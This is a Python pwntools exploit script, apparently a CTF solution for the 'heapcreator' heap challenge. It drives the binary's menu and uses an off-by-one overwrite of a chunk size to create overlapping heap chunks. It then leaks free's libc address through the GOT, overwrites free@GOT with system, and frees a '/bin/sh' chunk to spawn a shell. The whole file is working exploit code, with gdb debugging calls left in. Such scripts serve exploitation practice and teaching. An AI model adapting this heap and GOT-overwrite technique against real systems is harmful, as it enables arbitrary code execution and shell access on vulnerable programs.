#!/usr/bin/env python
from pwn import *
#sh = remote('127.0.0.1',9527)
sh = process('./heapcreator')
elf=ELF('./heapcreator')
#context.log_level='debug'
lib = ELF('/lib/x86_64-linux-gnu/libc.so.6')
 
def create(l,value):
    sh.recvuntil('Your choice :')
    sh.sendline('1')
    sh.recvuntil('Size of Heap : ')
    sh.sendline(str(int(l)))
    sh.recvuntil('Content of heap:')
    sh.sendline(value)
 
def edit(index,value):
    sh.recvuntil('Your choice :')
    sh.sendline('2')
    sh.recvuntil('Index :')
    #if index == 2:gdb.attach(sh)
    sh.sendline(str(index))
    sh.recvuntil('Content of heap : ')
    sh.sendline(value)
def show(index):
    sh.recvuntil('Your choice :')
    sh.sendline('3')
    sh.recvuntil('Index :')
    sh.sendline(str(index))
def delete(index):
    sh.recvuntil('Your choice :')
    sh.sendline('4')
    sh.recvuntil('Index :')
    sh.sendline(str(index))
#leak free addr
gdb.attach(sh)
pause()
create(0x18,'aaaa')#0
create(0x10,'bbbb')#1
create(0x10,'cccc')#2
create(0x10,'/bin/sh')#3
pause()
gdb.attach(sh)
edit(0,'a'*0x18+'\x81')
pause()
gdb.attach(sh)
delete(1)
pause()
gdb.attach(sh)
size = '\x07'.ljust(8,'\x00')
payload = 'd'*0x40+ size + p64(elf.got['free'])
create(0x70,payload)#1
pause()
gdb.attach(sh)
show(2)
sh.recvuntil('Content : ')
free_addr = u64(sh.recvuntil('Done')[:-5].ljust(8,'\x00'))
success('free_addr = '+str(hex(free_addr)))
#trim free_got
system_addr = free_addr + lib.symbols['system']-lib.symbols['free']
success('system_addr = '+str(hex(system_addr)))
#gdb.attach(sh)
edit(2,p64(system_addr))
pause()
gdb.attach(sh)
#gdb.attach(sh)

delete(3)
sh.interactive()
